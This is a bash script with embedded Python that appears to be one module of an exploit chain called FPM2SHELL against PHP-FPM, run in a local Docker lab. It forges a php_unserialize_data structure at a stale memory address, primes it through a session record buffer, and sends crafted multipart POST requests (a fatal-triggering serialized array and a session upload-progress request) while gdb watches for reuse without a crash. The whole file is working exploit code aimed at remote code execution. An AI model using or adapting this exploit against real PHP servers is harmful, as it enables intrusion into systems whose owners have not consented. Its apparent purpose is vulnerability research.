#!/usr/bin/env bash
# FPM2SHELL module 3c: plant a valid php_unserialize_data struct at the stale
# decoder address via the session record buffer; prove reuse without SIGSEGV.
set -u
SID="f2sfake000000000000000000000001"
D="${F2S_D:-0x7f886e26c000}"
LAB="$(cd "$(dirname "$0")" && pwd)"
TMP=$(mktemp -d)

python3 - "$D" "$LAB/app/payload.bin" <<'PYEOF'
import sys, struct, os
D = int(sys.argv[1], 16)
L = 65536
prefix = b'blob|s:%d:"' % L
payload = bytearray(b'P' * L)
off = 0x1FE8 - len(prefix)
s = bytearray(8208)          # sizeof(php_unserialize_data) with VAR_ENTRIES_MAX=1018
struct.pack_into("<Q", s, 0, D + 56)   # last = &entries
struct.pack_into("<Q", s, 56, 0)       # entries.used_slots = 0
struct.pack_into("<Q", s, 64, 0)       # entries.next = NULL
payload[off:off+8208] = s
open(sys.argv[2],'wb').write(payload)
print("[i] payload: L=%d struct_off=%#x last=%#x" % (L, off, D + 56))
PYEOF

docker exec f2s-php sh -c "kill \$(pgrep gdb) 2>/dev/null; kill \$(pgrep -f 'pool www') 2>/dev/null"; sleep 1.5
PID=$(docker exec f2s-php pgrep -f 'pool www' | head -1); echo "[i] worker=$PID"
docker cp "$LAB/g9.gdb" f2s-php:/tmp/g9.gdb
docker exec f2s-php sh -c ": > /tmp/fake9.out"
docker exec -d f2s-php sh -c "gdb -batch -p $PID -x /tmp/g9.gdb > /tmp/fake9.out 2>&1"
sleep 2.5

post() {
  python3 - "$1" "$2" "$SID" <<'PYEOF'
import sys, http.client
path, bf, sid = sys.argv[1], sys.argv[2], sys.argv[3]
body = open(bf,"rb").read(); B=b"----f2sfake00000000"
c = http.client.HTTPConnection("127.0.0.1",18120,timeout=60)
c.request("POST", path, body=body, headers={"Content-Type":f"multipart/form-data; boundary={B.decode()}","Content-Length":str(len(body)),"Cookie":f"PHPSESSID={sid}"})
r=c.getresponse(); print("[%s]" % path, r.status, r.read(60).decode("latin1","replace")[:50]); c.close()
PYEOF
}

python3 - "$TMP" <<'PYEOF'
import sys
B=b"----f2sfake00000000"
def part(n,b,fn=None):
    d=f'Content-Disposition: form-data; name="{n}"'
    if fn is not None: d+=f'; filename="{fn}"'
    return b"--"+B+b"\r\n"+d.encode()+b"\r\n\r\n"+b+b"\r\n"
open(sys.argv[1]+"/poison","wb").write(part("p",b"1")+b"--"+B+b"--\r\n")
elems=b"".join(b"i:%d;a:1:{i:0;i:1;}"%i for i in range(40000))
open(sys.argv[1]+"/fatal","wb").write(part("filler",b"Q"*4000000)+part("data",b"a:%d:{%s}"%(40000,elems))+b"--"+B+b"--\r\n")
open(sys.argv[1]+"/b","wb").write(part("PHPSESSID",b"f2sfake000000000000000000000001")+part("PHP_SESSION_UPLOAD_PROGRESS",b"fk1")+part("f",b"",fn="a")+b"--"+B+b"--\r\n")
PYEOF

post /poison.php "$TMP/poison"; sleep 0.3
post /index.php "$TMP/fatal"; sleep 0.4
post /index.php "$TMP/b"; sleep 0.6
echo "[i] worker after: $(docker exec f2s-php pgrep -f 'pool www' | head -1)"
docker exec f2s-php sh -c "grep -aE 'VARTMP|SIGSEGV|^#0' /tmp/fake9.out | tail -10"
rm -rf "$TMP"
